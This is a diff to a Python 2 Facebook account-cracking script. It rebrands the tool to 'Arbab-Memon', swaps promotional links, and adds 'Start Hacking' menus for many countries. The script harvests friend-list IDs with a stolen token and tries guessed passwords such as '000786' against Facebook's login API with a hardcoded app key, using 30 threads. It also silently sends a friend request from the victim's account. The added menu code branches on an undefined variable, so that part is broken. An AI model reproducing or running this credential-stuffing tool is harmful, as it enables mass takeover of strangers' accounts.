@@ -95,15 +95,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;94mTool Password \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:love_hacker
+            print "Logged in successfully as " + username #Dev:Arbab-Memon
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+            os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 
 def login():
 	os.system('clear')
@@ -147,15 +147,15 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;94mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				print '\n\x1b[1;94mLogin Successful With Arbab.•◈•..'
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
+				print"\n\x1b[1;97mSudhar ja Pahle Net theak kar phir commond pe aa"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			print("\n\x1b[1;97mBeeru phat gae na account cp pe he")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -183,24 +183,33 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;97mMeri jan doosra acount login kar cp pe he"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;94mThere is no internet connection"
+		print"\x1b[1;94minternet chek kar pahle "
 		keluar()
-	os.system("clear") #Dev:love_hacker
+	os.system("clear") #Dev:Arbab-Memon
 	print logo
 	print "\033[1;97m«--•◈••◈•--\033[1;94mLogged in User Info\033[1;97m---•◈••◈•---»"
 	print "	   \033[1;97m Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
 	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mArbabMemon\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mStart Cloning India√"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mStart Cloning Pakistan√"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mStart Cloning Indonasia√"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m4.\033[1;91mAfter Cloning Data Reset"
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;94mlogout "
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mStart Hacking India√"
+        print "\033[1;97m-•◈•-\033[1;96m> \033[1;96m2.\x1b[1;92mStart Hacking Pakistan√"
+        print "\033[1;97m-•◈•-\033[1;95m> \033[1;95m3.\x1b[1;96mStart Hacking Indonasia√"
+	print "\033[1;97m-•◈•-\033[1;94m> \033[1;94m4.\x1b[1;96mStart Hacking Iran√"
+	print "\033[1;97m-•◈•-\033[1;93m> \033[1;93m5.\x1b[1;96mStart Hacking Iraq√"
+	print "\033[1;97m-•◈•-\033[1;92m> \033[1;92m6.\x1b[1;96mStart Hacking America(USA)√"
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m7.\x1b[1;96mStart Hacking Turkey√"
+	print "\033[1;97m-•◈•-\033[1;39m> \033[1;39m8.\x1b[1;96mStart Hacking Bangladesh√"
+	print "\033[1;97m-•◈•-\033[1;38m> \033[1;38m9.\x1b[1;96mStart Hacking Germany√"
+	print "\033[1;97m-•◈•-\033[1;37m> \033[1;37m10.\x1b[1;96mStart Hacking Afghanistan√"
+	print "\033[1;97m-•◈•-\033[1;36m> \033[1;36m11.\x1b[1;96mStart Hacking Japan (Korean)√"
+	print "\033[1;97m-•◈•-\033[1;35m> \033[1;35m12.\x1b[1;96mStart Hacking Austrlia (Comming soon)√"
+        print "\033[1;97m-•◈•-\033[1;34m> \033[1;34m13.\033[1;91mAfter Cloning Data Reset"
+	print "\033[1;97m-•◈•-\033[1;33m> \033[1;33m0.\033[1;94mCommond Will update daily "
 	pilih()
 
 
@@ -215,7 +224,23 @@ def pilih():
 		crack()
         elif unikers =="3":
 		hack()
-	elif unikers =="4":
+	elif peak =="4":
+	        hack()
+        elif peak =="5":
+	        black()
+        elif peak =="6":
+	        mafia()
+        elif peak =="7":
+	        test()
+        elif peak =="8":
+	        phone()
+        elif peak =="9":
+	        mail()
+        elif peak =="10":
+	        isi()
+        elif peak =="11":
+	        army()
+	elif unikers =="13":
 		os.system('clear')
 		print logo
 		print " \033[1;36;40m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Data Reset•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
@@ -254,8 +279,8 @@ def crack():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mWhatsap Group Upload Soon."
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mYoutube Chenal Upload Soon."
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mWhatsap Group Join+923003023263."
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mCyber Gange Hidden Tricker."
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_crack()
 
@@ -283,10 +308,10 @@ def pilih_crack():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -311,7 +336,7 @@ def pilih_crack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Arbab-Memon
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -381,7 +406,7 @@ def pilih_crack():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['first_name'] + 'khan'											
+						           pass4 = '000786'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -521,7 +546,7 @@ def pilih_crack():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By Arbab-Memon--•◈•---»" #Dev:love_hacker
+	print "  \033[1;91m«---•◈•---Developed By Arbab-Memon--•◈•---»" #Dev:Arbab-Memon
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -612,7 +637,7 @@ def pilih_hack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Arbab-Memon
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -915,7 +940,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Arbab-Memon
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
